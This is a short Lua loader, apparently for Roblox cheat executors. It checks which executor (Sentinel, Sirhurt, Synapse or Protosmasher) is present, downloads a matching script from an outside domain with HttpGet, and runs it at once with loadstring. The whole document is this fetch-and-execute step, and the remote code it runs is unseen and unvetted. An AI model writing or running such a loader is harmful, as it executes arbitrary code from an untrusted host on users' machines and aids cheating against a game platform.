local Exploit = secure_load and "Sentinel" or is_sirhurt_closure and "Sirhurt" or syn and "Synapse" or pebc_execute and "Protosmasher"

local link = game:HttpGet("http://vilotstar.gq/scripts/"..Exploit..".lua", true)

loadstring(link)()